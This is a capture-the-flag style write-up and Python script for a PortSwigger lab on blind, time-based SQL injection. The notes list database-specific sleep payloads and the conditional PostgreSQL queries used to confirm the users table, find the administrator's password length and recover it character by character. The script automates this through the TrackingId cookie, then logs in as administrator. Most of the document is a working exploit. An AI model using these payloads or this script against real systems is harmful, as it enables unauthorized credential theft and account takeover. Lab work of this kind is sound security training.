'''
Notes: 

Link: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

1. Vulnerability:  Tracking Cookie (Blind SQLi)

2. Goal: 1. Enumerate the Administrator's Password
         2. Log in the administrator Account

3 Analysis: 1. Confirming the parameter is vulnerable
            * Backend Query: SELECT trackingid from trackingtable where trackignid = '<id>'
                
                [-] Oracle 	dbms_pipe.receive_message(('a'),10)    # ' || (dbms_pipe.receive_message(('a'),10))--
                [-] Microsoft 	WAITFOR DELAY '0:0:10'     # ' || (WAITFOR DELAY '0:0:10')--
                [+] PostgreSQL 	SELECT pg_sleep(10)    # ' || (SELECT pg_sleep(10))--
                [-] MySQL 	SELECT SLEEP(10)    # ' || (SELECT SLEEP(10))-- 
                     
                    [+] Database is PostgreSQL

                        Conditional time delays
                            
                        You can test a single boolean condition and trigger a time delay if the condition is true.
                        [-] Oracle 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
                        [-] Microsoft 	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
                        [+] PostgreSQL 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
                        [-] MySQL 	SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a') 

                           
                            ' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END) --    # Works (Reply came after 10 seconds)

            2. Confirming if the User table Exists
                ' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users) -- #Confirmed users Table Exits!

            3. Confirm the username administrator exits
                
                ' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users) --    #Verified (Delay was there)

            4. Confirming the length of the administrator's Password:
                
                ' || (SELECT CASE WHEN (username='administrator' and LENGTH(password)=20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users) --    # Verifies -> 20 Characters

            6. Enumerating the administrator password character by character

                ' || (SELECT CASE WHEN (username='administrator' and SUBSTRING('password',1,1)='p') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users) --              
                
                
                ' || (SELECT CASE WHEN (username='administrator' and SUBSTRING('password',1,1)='1') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users) --   # !0 Second Delay, Hence First Character is '1'

                Similarly making the whole password: 
                    
                    1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
                    1 r t g 8 c 1 t s  u  8  d  0  h  9  7  y  a  m  r

                    1rtg8c1tsu8d0h97yamr

                
            
4. Exploit: ;)



Code reference: https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/sql-injection/lab-12/sqli-lab-12.py

'''


import sys
import requests
import urllib3
import urllib
from bs4 import BeautifulSoup  # Ensure you have BeautifulSoup installed

# Disable warnings for insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set up proxy for HTTP requests (if needed)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Helper function to send the payload and return the response
def send_payload(url, cookies):
    try:
        response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    except:
        # If there's an issue with the proxy, send the request without it
        response = requests.get(url, cookies=cookies, verify=False)
    return response

# Function to extract the administrator's password using SQL injection
def extract_admin_password(url, tracking_id, session_id):
    password_extracted = ""  # Initialize an empty string to store the extracted password
    
    # Loop through the length of the password (assumed to be 20 characters)
    for char_position in range(1, 21):
        for ascii_value in range(32, 126):  # Loop through possible ASCII values for characters
            # Construct the SQL injection payload to retrieve the character at the current position
            sql_injection_payload = "' || (SELECT CASE WHEN (username='administrator' and ASCII(SUBSTRING(password,%s,1))='%s') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users) --" % (char_position, ascii_value)
            payload_encoded = urllib.parse.quote(sql_injection_payload)  # URL encode the payload
            
            # Set cookies with the dynamically retrieved tracking ID and session ID
            cookies = {
                'TrackingId': tracking_id + payload_encoded, 
                'session': session_id
            }
            
            # Send the request with the constructed cookies
            response = send_payload(url, cookies)
            
            if int(response.elapsed.total_seconds()) >= 10:
                password_extracted += chr(ascii_value)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(ascii_value))
                sys.stdout.flush()
            
            # If the password length reaches 20, display the complete password and attempt to log in
            if len(password_extracted) >= 20:
                print(f"\n[+] The administrator password is: {password_extracted}")
                # Attempt to log in as the administrator
                if login_as_admin(requests.Session(), url + "/login", password_extracted):
                    print("[+] SQL injection successful! Logged in as Administrator :)")
                else:
                    print("[-] SQL injection unsuccessful!")    
                return  # Exit the function once the password is found

    # If the process fails, indicate failure to retrieve credentials
    print("[-] Failed to retrieve administrator credentials.")

# Function to get the initial cookie values (TrackingId and session)
def get_initial_cookies(url):
    try:
        response = requests.get(url, verify=False, proxies=proxies)
    except:
        response = requests.get(url, verify=False)
    
    # Extract cookies from the response
    tracking_id = response.cookies.get('TrackingId', '')
    session_id = response.cookies.get('session', '')

    # Check if cookies were retrieved successfully
    if not tracking_id or not session_id:
        print("[-] Failed to retrieve cookies from the target website.")
        sys.exit(1)  # Exit if cookies are not found

    return tracking_id, session_id

# Function to get CSRF token from the login page
def get_csrf_token(session, url):
    try:
        response = session.get(url, verify=False, proxies=proxies)
    except: 
        response = session.get(url, verify=False)

    # Parse the response to find the CSRF token
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input")['value']
    return csrf_token

# Function to log in as the administrator using the extracted password
def login_as_admin(session, url_login, admin_password):
    csrf_token = get_csrf_token(session, url_login)  # Get CSRF token
    login_data = {
        "csrf": csrf_token,
        "username": "administrator",
        "password": admin_password
    }
    
    try:
        # Send a POST request to log in
        response = session.post(url_login, data=login_data, verify=False, proxies=proxies)
    except:
        response = session.post(url_login, data=login_data, verify=False)

    # Check if login was successful by looking for the logout message
    if "Log out" in response.text:
        return True  # Return true if logged in successfully
    else:
        return False  # Return false if login failed

# Main function to execute the SQL injection attack
def main(): 
    try:
        url = sys.argv[1]
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        # Edit The url
        url = 'https://0a5f002204305508810c5758000200a9.web-security-academy.net'  # Update Domain here  
    
    print("(+) Retrieving initial cookies from the website...")
    tracking_id, session_id = get_initial_cookies(url)  # Retrieve the cookies dynamically

    print("(+) Retrieving administrator password...")
    extract_admin_password(url, tracking_id, session_id)  # Start the password extraction process

# Run the main function when the script is executed
if __name__ == "__main__":
    main()

